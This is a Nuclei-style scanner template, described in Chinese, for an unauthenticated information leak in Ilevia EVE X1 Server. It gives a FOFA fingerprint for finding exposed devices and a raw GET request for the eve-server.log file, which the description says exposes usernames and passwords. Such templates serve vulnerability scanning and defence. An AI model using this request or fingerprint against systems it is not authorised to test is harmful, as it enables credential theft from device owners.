id: Ilevia-EVE-X1-Server-eve-server-Information-Disclosure

info:
  name: Ilevia EVE X1 Server eve-server.log 信息泄露
  author: HuanXiong
  severity: medium
  description: |-
    fofa: icon_hash="392278119"
    Ilevia EVE X1 Server eve-server.log 文件存在信息泄露漏洞，未经身份认证的攻击者可获取用户名密码等敏感信息，使系统处于极不安全状态。
  reference:
    - 
  tags: Information Disclosure
  
http:
  - raw:
      - |-
        GET /80-history/eve-server.log HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36

    matchers:
      - type: dsl
        name: 信息泄露
        dsl:
          - 'status_code==200 && contains_all(body,"admin","Message")'